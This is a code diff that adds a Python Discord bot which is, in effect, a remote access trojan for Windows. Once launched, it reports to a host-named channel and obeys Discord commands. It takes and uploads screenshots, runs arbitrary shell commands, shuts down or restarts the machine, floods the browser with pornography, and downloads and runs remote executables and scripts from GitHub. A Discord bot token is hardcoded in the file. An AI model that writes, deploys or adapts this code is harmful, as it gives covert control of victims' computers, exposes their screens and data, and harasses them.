@@ -1,0 +1,178 @@
+import discord
+from discord.ext import commands, tasks
+import os
+import webbrowser
+import tkinter as tk
+import shutil
+import threading
+import json
+import base64
+import sqlite3
+import subprocess
+import ctypes
+import random
+import socket
+import pyautogui
+import asyncio
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+def is_correct_channel(ctx):
+    pc_hostname = socket.gethostname().lower()
+    green_marker = "🟢"
+    correct_channel_name = f"{pc_hostname}-{green_marker}"
+    
+    if green_marker not in ctx.channel.name:
+        return False
+    
+    if correct_channel_name not in ctx.channel.name:
+        return False
+    
+    return True
+
+@bot.event
+async def on_ready():
+    print(f'Logged in as {bot.user.name}')
+    check_and_update_channel.start()
+
+@tasks.loop(minutes=1)
+async def check_and_update_channel():
+    pc_hostname = socket.gethostname().lower()
+    green_marker = "🟢"
+    correct_channel_name = f"{pc_hostname}-{green_marker}"
+    
+    # Check if the channel already exists
+    channel = discord.utils.get(bot.get_all_channels(), name=correct_channel_name)
+    
+    if channel:
+        await channel.send("@everyone @here File ran.")
+    else:
+        guild = bot.guilds[0]  # Assuming the bot is in one guild
+        new_channel = await guild.create_text_channel(name=correct_channel_name)
+        await new_channel.send("@everyone @here File ran.")
+
+@bot.command()
+async def screenshot(ctx):
+    if not is_correct_channel(ctx):
+        return
+
+    await ctx.send("Taking screenshot...")
+
+    screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
+    pyautogui.screenshot(screenshot_path)
+
+    await ctx.send(file=discord.File(screenshot_path))
+
+    os.remove(screenshot_path)
+
+@bot.command()
+async def thehub(ctx):
+    if not is_correct_channel(ctx):
+        return
+    
+    await ctx.send("Opening pornhub.com 100 times in the default web browser...")
+
+    for _ in range(100):
+        webbrowser.open("https://pornhub.com")
+
+@bot.command()
+async def fbibet(ctx):
+    if not is_correct_channel(ctx):
+        return
+    
+    await ctx.send("Opening FBI.BET in a tkinter window...")
+
+    root = tk.Tk()
+    root.title("FBI.BET")
+    root.geometry("500x750")
+
+    def center_window(window):
+        window.update_idletasks()
+        screen_width = window.winfo_screenwidth()
+        screen_height = window.winfo_screenheight()
+        size = tuple(int(_) for _ in window.geometry().split('+')[0].split('x'))
+        x = screen_width / 2 - size[0] / 2
+        y = screen_height / 2 - size[1] / 2
+        window.geometry("+%d+%d" % (x, y))
+
+    webbrowser.open("https://fbi.bet")
+
+    center_window(root)
+
+    ctypes.windll.user32.MessageBoxW(0, "You cannot close this window. Use Task Manager to close it.", "Warning", 0x30)
+
+    root.mainloop()
+
+@bot.command()
+async def ramgobrrr(ctx):
+    if not is_correct_channel(ctx):
+        return
+    
+    await ctx.send("Downloading and running troll programs...")
+
+    urls = [
+        "https://raw.githubusercontent.com/BongBongWee/_/main/A.bat",
+        "https://github.com/OverpoweredCoding/BAT-Fake-VirusPrank-Extreme-Version-/raw/main/Virus/If%20you%20run%20this%20you%20are%20stupid.exe",
+        "https://raw.githubusercontent.com/apollo6901ap0ii/fake-troll-viruses/master/multiple%20programs%20attack.bat",
+        "https://github.com/016629/Troll-Stuff/raw/master/Wirus.vbs",
+        "https://raw.githubusercontent.com/016629/Troll-Stuff/master/RickRoll.bat"
+    ]
+
+    for url in urls:
+        file_name = url.split("/")[-1]
+        file_path = os.path.join(os.getenv('TEMP'), file_name)
+        subprocess.run(["curl", "-o", file_path, url], shell=True)
+        subprocess.Popen([file_path], shell=True)
+
+@bot.command()
+async def sleep(ctx):
+    if not is_correct_channel(ctx):
+        return
+    
+    await ctx.send("Putting system to sleep...")
+
+    ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
+
+@bot.command()
+async def shutdown(ctx):
+    if not is_correct_channel(ctx):
+        return
+    
+    await ctx.send("Shutting down system...")
+
+    subprocess.run(["shutdown", "/s", "/t", "0"])
+
+@bot.command()
+async def restart(ctx):
+    if not is_correct_channel(ctx):
+        return
+    
+    await ctx.send("Restarting system...")
+
+    subprocess.run(["shutdown", "/r", "/t", "0"])
+
+@bot.command()
+async def cmd(ctx, *, command: str):
+    if not is_correct_channel(ctx):
+        return
+    
+    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    output, error = await process.communicate()
+
+    if output:
+        await ctx.send(f"```\n{output.decode('utf-8')}\n```")
+    if error:
+        await ctx.send(f"```\n{error.decode('utf-8')}\n```")
+
+@bot.command()
+async def messagebox(ctx, *, message: str):
+    if not is_correct_channel(ctx):
+        return
+    
+    root = tk.Tk()
+    root.withdraw()
+    ctypes.windll.user32.MessageBoxW(0, message, "Message from Discord", 0x40)
+    root.destroy()
+
+bot.run("MTI1NzU5NzQxNzM2OTM3NDcyMA.Gdv8pz.j8MgoMy-mvWVYn1ziJ8uAQUDzWzWFqb-VMEtaA")
